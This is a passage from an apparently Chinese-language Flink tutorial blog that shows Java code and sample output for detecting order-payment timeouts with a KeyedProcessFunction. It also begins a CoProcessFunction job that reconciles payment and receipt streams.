OrderResult&#123;orderId=34746, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34745, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34744, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34743, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34742, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34741, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34740, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34739, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34738, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34737, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34736, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34735, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34734, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34733, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34732, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34731, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34730, resultState=&#x27;payed&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-ProcessFunction实现"><a href="#代码2-ProcessFunction实现" class="headerlink" title="代码2-ProcessFunction实现"></a>代码2-ProcessFunction实现</h6><p>CEP虽然更加简洁，但是ProcessFunction能控制的细节操作更多。</p><p>CEP还是比较适合事件之间有复杂联系的场景；</p><p>ProcessFunction用来处理每个独立且靠状态就能联系的事件，灵活性更高。</p><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.OrderResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 4:59 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderTimeoutWithoutCep</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义超时事件的侧输出流标签</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> OutputTag&lt;OrderResult&gt; orderTimeoutTag = <span class="keyword">new</span> OutputTag&lt;OrderResult&gt;(<span class="string">&quot;order-timeout&quot;</span>) &#123;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取数据并转换成POJO类型</span></span><br><span class="line">    URL resource = OrderPayTimeout.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义自定义处理函数，主流输出正常匹配订单事件，侧输出流输出超时报警事件</span></span><br><span class="line">    SingleOutputStreamOperator&lt;OrderResult&gt; resultStream = orderEventDataStream.keyBy(OrderEvent::getOrderId)</span><br><span class="line">      .process(<span class="keyword">new</span> OrderPayMatchDetect());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;pay normally&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(orderTimeoutTag).print(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;order timeout detect without cep job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPayMatchDetect</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">OrderEvent</span>, <span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 定义状态，保存之前点单是否已经来过create、pay的事件</span></span><br><span class="line">    ValueState&lt;Boolean&gt; isPayedState;</span><br><span class="line">    ValueState&lt;Boolean&gt; isCreatedState;</span><br><span class="line">    <span class="comment">// 定义状态，保存定时器时间戳</span></span><br><span class="line">    ValueState&lt;Long&gt; timerTsState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      isPayedState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Boolean&gt;(<span class="string">&quot;is-payed&quot;</span>, Boolean.class, <span class="keyword">false</span>));</span><br><span class="line">      isCreatedState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Boolean&gt;(<span class="string">&quot;is-created&quot;</span>, Boolean.class, <span class="keyword">false</span>));</span><br><span class="line">      timerTsState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;timer-ts&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(OrderEvent value, Context ctx, Collector&lt;OrderResult&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 先获取当前状态</span></span><br><span class="line">      Boolean isPayed = isPayedState.value();</span><br><span class="line">      Boolean isCreated = isCreatedState.value();</span><br><span class="line">      Long timerTs = timerTsState.value();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 判断当前事件类型</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;create&quot;</span>.equals(value.getEventType())) &#123;</span><br><span class="line">        <span class="comment">// 1. 如果来的是create，要判断是否支付过</span></span><br><span class="line">        <span class="keyword">if</span> (isPayed) &#123;</span><br><span class="line">          <span class="comment">// 1.1 如果已经正常支付，输出正常匹配结果</span></span><br><span class="line">          out.collect(<span class="keyword">new</span> OrderResult(value.getOrderId(), <span class="string">&quot;payed successfully&quot;</span>));</span><br><span class="line">          <span class="comment">// 清空状态，删除定时器</span></span><br><span class="line">          isCreatedState.clear();</span><br><span class="line">          isPayedState.clear();</span><br><span class="line">          timerTsState.clear();</span><br><span class="line">          ctx.timerService().deleteEventTimeTimer(timerTs);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 1.2 如果没有支付过，注册15分钟后的定时器，开始等待支付事件</span></span><br><span class="line">          Long ts = (value.getTimestamp() + <span class="number">15</span> * <span class="number">60</span>) * <span class="number">1000L</span>;</span><br><span class="line">          ctx.timerService().registerEventTimeTimer(ts);</span><br><span class="line">          <span class="comment">// 更新状态</span></span><br><span class="line">          timerTsState.update(ts);</span><br><span class="line">          isCreatedState.update(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;pay&quot;</span>.equals(value.getEventType())) &#123;</span><br><span class="line">        <span class="comment">// 2. 如果来的是pay，要判断是否有下单事件来过</span></span><br><span class="line">        <span class="keyword">if</span> (isCreated) &#123;</span><br><span class="line">          <span class="comment">// 2.1 已经有过下单事件，要继续判断支付的时间戳是否超过15分钟</span></span><br><span class="line">          <span class="keyword">if</span> (value.getTimestamp() * <span class="number">1000L</span> &lt; timerTs) &#123;</span><br><span class="line">            <span class="comment">// 2.1.1 在15分钟内，没有超时，正常匹配输出</span></span><br><span class="line">            out.collect(<span class="keyword">new</span> OrderResult(value.getOrderId(), <span class="string">&quot;payed successfully&quot;</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 2.1.2 已经超时，输出侧输出流报警</span></span><br><span class="line">            ctx.output(orderTimeoutTag, <span class="keyword">new</span> OrderResult(value.getOrderId(), <span class="string">&quot;payed but already timeout&quot;</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 统一清空状态</span></span><br><span class="line">          isCreatedState.clear();</span><br><span class="line">          isPayedState.clear();</span><br><span class="line">          timerTsState.clear();</span><br><span class="line">          ctx.timerService().deleteEventTimeTimer(timerTs);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 2.2 没有下单事件，乱序，注册一个定时器，等待下单事件</span></span><br><span class="line">          ctx.timerService().registerEventTimeTimer(value.getTimestamp() * <span class="number">1000L</span>);</span><br><span class="line">          <span class="comment">// 更新状态</span></span><br><span class="line">          timerTsState.update(value.getTimestamp() * <span class="number">1000L</span>);</span><br><span class="line">          isPayedState.update(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;OrderResult&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 定时器触发，说明一定有一个事件没来</span></span><br><span class="line">      <span class="keyword">if</span> (isPayedState.value()) &#123;</span><br><span class="line">        <span class="comment">// 如果pay来了，说明create没来</span></span><br><span class="line">        ctx.output(orderTimeoutTag, <span class="keyword">new</span> OrderResult(ctx.getCurrentKey(), <span class="string">&quot;payed but not found created log&quot;</span>));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果pay没来，支付超时</span></span><br><span class="line">        ctx.output(orderTimeoutTag, <span class="keyword">new</span> OrderResult(ctx.getCurrentKey(), <span class="string">&quot;timeout&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 清空状态</span></span><br><span class="line">      isCreatedState.clear();</span><br><span class="line">      isPayedState.clear();</span><br><span class="line">      timerTsState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pay normally&gt; OrderResult&#123;orderId=34729, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34730, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34731, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34732, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34734, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34733, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34735, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34736, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34746, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34738, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34745, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34741, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34747, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34743, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34737, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34744, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34742, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34739, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34740, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34753, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34749, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34755, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34752, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34748, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34751, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34750, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34761, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34759, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34754, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34758, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34760, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34757, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34762, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34763, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34764, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34765, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34766, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34767, resultState=<span class="string">&#x27;payed but already timeout&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34768, resultState=<span class="string">&#x27;payed but not found created log&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34756, resultState=<span class="string">&#x27;timeout&#x27;</span>&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="订单支付实时对帐"><a href="#订单支付实时对帐" class="headerlink" title="订单支付实时对帐"></a>订单支付实时对帐</h5><ul><li>基本需求 <ul><li>用户下单并支付之后，应查询到账信息，进行实时对帐</li><li>如果有不匹配的支付信息或者到账信息，输出提示信息</li></ul></li><li>解决思路 <ul><li>从两条流中分别读取订单支付信息和到账信息，合并处理</li><li>用connect连接合并两条流，用coProcessFunction做匹配处理</li></ul></li></ul><h6 id="POJO-6"><a href="#POJO-6" class="headerlink" title="POJO"></a>POJO</h6><ul><li> ReceiptEvent  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String txId;</span><br><span class="line"><span class="keyword">private</span> String payChannel;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码1-具体实现"><a href="#代码1-具体实现" class="headerlink" title="代码1-具体实现"></a>代码1-具体实现</h6><ul><li><p> java代码实现  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.ReceiptEvent;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.CoProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 5:34 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义侧输出流标签</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> OutputTag&lt;OrderEvent&gt; unmatchedPays = <span class="keyword">new</span> OutputTag&lt;OrderEvent&gt;(<span class="string">&quot;unmatched-pays&quot;</span>)&#123;&#125;;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> OutputTag&lt;ReceiptEvent&gt; unmatchedReceipts = <span class="keyword">new</span> OutputTag&lt;ReceiptEvent&gt;(<span class="string">&quot;unmatched-receipts&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 